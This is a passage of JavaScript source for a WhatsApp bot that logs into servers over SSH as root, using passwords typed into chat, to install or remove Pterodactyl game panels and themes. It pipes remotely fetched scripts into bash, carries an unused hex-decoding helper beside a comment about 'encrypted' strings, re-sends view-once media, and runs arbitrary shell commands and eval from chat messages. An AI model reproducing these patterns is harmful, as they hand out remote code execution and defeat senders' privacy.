        m.reply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: All installations have been completed please create an allocation on the node created by the bot and take the Configuration Token and type .startwings (token) nNote: *PLEASE WAIT 1-5 MINUTES FOR THE WEB TO OPEN*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write('Xyra\n');
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Auto Install Node\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break

case 'configure-wings': case 'startwings': {
if (!isOwner) return ('Sorry Only For The Owner')
let t = text.split(',');
if (t.length < 3) return m.reply(`*Incorrect format!*\nUsage: ${prefix}startwings ipvps,paaswdvps,token ( token configure )`)
let ipvps = t[0];
let passwd = t[1];
let commandwings = t[2];
const connSettings = {
    host: ipvps,
    port: '22',
    username: 'root',
    password: passwd
};

const command = `${commandwings}`;

const conn = new Client();
conn.on('ready', () => {
          m.reply('*PROSES CONFIGURE WINGS*')
    conn.exec(command, (err, stream) => {
        if (err) throw err;
        stream.on('close', (code, signal) => {
            console.log('Stream closed with code ' + code + ' and signal ' + signal);
            conn.end();
        }).on('data', (data) => {
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }

          if (data.toString().includes('Input')) {
            stream.write('systemctl start wings\n');
          }
          console.log('STDOUT: ' + data);
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data);
        });
    });
}).connect(connSettings);
await new Promise(resolve => setTimeout(resolve, 90000));
m.reply(`SUCCES CONFIGURE WINGS SELSAI`)
}


break 

case 'uninstall-panel':{
if (!isOwner) return ('Sorry Only For The Owner')
let t = text.split(',');
if (t.length < 3) return m.reply(`*Incorrect format!*\nUsage: ${prefix}uninstall-panel ipvps,paaswdvps,`)
let ipvps = t[0];
let passwd = t[1];

const connSettings = {
    host: ipvps,
    port: '22',
    username: 'root',
    password: passwd
};

const command = `bash <(curl -s https://pterodactyl-installer.se)`;

const conn = new Client();
conn.on('ready', () => {
          m.reply('*UNISNATALL PANEL PROCESS*')
    conn.exec(command, (err, stream) => {
        if (err) throw err;
        stream.on('close', (code, signal) => {
            console.log('Stream closed with code ' + code + ' and signal ' + signal);
            conn.end();
        }).on('data', (data) => {
          if (data.toString().includes('Input')) {
            stream.write('6\n');
          }

          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          console.log('STDOUT: ' + data);
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data);
        });
    });
}).connect(connSettings);
await new Promise(resolve => setTimeout(resolve, 8000));
m.reply(`SUCCES DELLETE PANEL`)
}

break
case 'install-stellar': {
    if (!isOwner) return m.reply("Especially for Stupid Owners")
    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Incorrect format!*\nUsage: ${prefix}install-stellar ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function Klee(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Danzzofficialv1/Xyraa-Hosting/refs/heads/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        m.reply('*THE THEME INSTALLATION PROCESS STARTS, PLEASE WAIT FOR THE NEXT 5-10 MINUTES*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                m.reply('`SUCCESSFUL INSTALLATION OF YOUR THEME PANEL, PLEASE CHECK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('Xyra\n');
                stream.write('1\n');
                stream.write('1\n');
                stream.write('y\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Invalid password or IP');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            m.reply('SUccsfully INSTALL THEME');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  
case 'install-billing': {
    if (!isOwner) return m.reply("Especially for Stupid Owners")
    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Incorrect format!*\nUsage: ${prefix}install-billing ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function Klee(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Danzzofficialv1/Xyraa-Hosting/refs/heads/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        m.reply('*THE THEME INSTALLATION PROCESS STARTS, PLEASE WAIT FOR THE NEXT 5-10 MINUTES*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                m.reply('`SUCCESSFUL INSTALLATION OF YOUR THEME PANEL, PLEASE CHECK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('Xyra\n');
                stream.write('1\n');
                stream.write('2\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Invalid password or IP');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            m.reply('successifully INSTALL THEME');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  
case 'install-enigma': {
    if (!isOwner) return m.reply("Especially for Stupid Owners")
    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Incorrect format!*\nUsage: ${prefix}install-enigma ipvps,password,linkwa,linkgc,linkch`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let linkwa = t[2];
    let linkgc = t[3];
    let linkch = t[4];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function Klee(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Danzzofficialv1/Xyraa-Hosting/refs/heads/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        m.reply('*THE THEME INSTALLATION PROCESS STARTS, PLEASE WAIT FOR THE NEXT 5-10 MINUTES*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                m.reply('`SUCCESSFUL INSTALLATION OF YOUR THEME PANEL, PLEASE CHECK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('Xyra\n');
                stream.write('1\n');
                stream.write('3\n');
                stream.write(`${linkwa}\n`);
                stream.write(`${linkgc}\n`);
                stream.write(`${linkch}\n`);
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Invalid password or IP');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            m.reply('successifully INSTALL THEME');
        }
    }, 300000); // 180000 ms = 3 menit
    
}
break  
case 'uninstall-theme': {
    if (!isOwner) return m.reply("Especially for Stupid Owners")
    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Incorrect format!*\nUsage: ${prefix}uninstall-theme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function Klee(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Danzzofficialv1/Xyraa-Hosting/refs/heads/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        m.reply('*PROSES UNINSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                m.reply('`successifully UNINSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('Xyra\n');
                stream.write('2\n');
                stream.write('y\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Invalid password or IP');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            m.reply('successifully UNINSTALL THEME');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  

     case 'delgc':
if (!isOwner) return m.reply('Sorry, this command is only for the owner.')
if (!isGroup) return m.reply("lazack owner")
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Success Not Active Klee - OfficiaL✅`)
break
case 'addgc':
if (!isOwner) return m.reply('Sorry, this command is only for the owner.')
if (!isGroup) return m.reply("lazack owner")
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Success Active To Crate Subdo Klee - OfficiaL✅`)
break 

case 'rvo': {
  const isQuotedViewOnce = m.message.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2 ? true : false;
if (!isQuotedViewOnce) return reply('Reply viewonce')
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await Klee.sendMessage(m.chat, { video: buffer, caption: quotedType.caption })
} else if (/image/.test(type)) {
await Klee.sendMessage(m.chat, { image: buffer, caption: quotedType.caption })
}
}
break          
case 'hdr': case 'remini':{
	   	if (!quoted) return reply(`what should i help ?`)
			if (!/image/.test(mime)) return reply(`Send/Reply to a photo ${prefix + command}`)
			reply("Proses Kak....")
			let media = await quoted.download()
			const { remini } = require('./all/remini.js')
			let proses = await remini(media, "enhance");
			Klee.sendMessage(m.chat, { image: proses, caption: '🍁 processs in lazack...'}, { quoted: m})
			await sleep(5000)
			}
			break
    case "sc": case "repo": {
let teksmenu = `
*Hello* @${m.sender.split("@")[0]}, good day
this is script not published yet but if you want it then dm the owner Lazack

_*LINK DOWNLOAD :*_ https://wa.me/255734980103
_*SCRIPT VERISON :* 3.5.0_ 

> Create by Lazack28
> TikTok : https://tiktok.com/@lazack-md
> GitHub : https://github.com/Lazack28
> Website : https://home.lazackorganisation.my.id/
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl:"https://whatsapp.com/channel/0029VaFytPbAojYm7RIs6l1x/", previewType: "PHOTO"}}}, {quoted: qchanel})
}
break


default:
if (budy.startsWith('�')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return Klee.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return Klee.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
Klee.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
Klee.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return Klee.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return Klee.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
Klee.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
